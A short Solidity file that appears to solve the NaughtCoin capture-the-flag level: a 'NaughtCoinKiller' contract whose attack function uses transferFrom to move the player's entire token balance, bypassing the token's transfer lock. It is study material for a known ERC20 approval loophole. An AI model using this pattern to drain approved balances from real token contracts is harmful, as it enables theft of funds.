// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface INaughtCoin {
    function player() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract NaughtCoinKiller {
    function attack(INaughtCoin coin) external {
        address player = coin.player();
        uint256 amount = coin.balanceOf(player);
        coin.transferFrom(player, address(this), amount);
    }
}
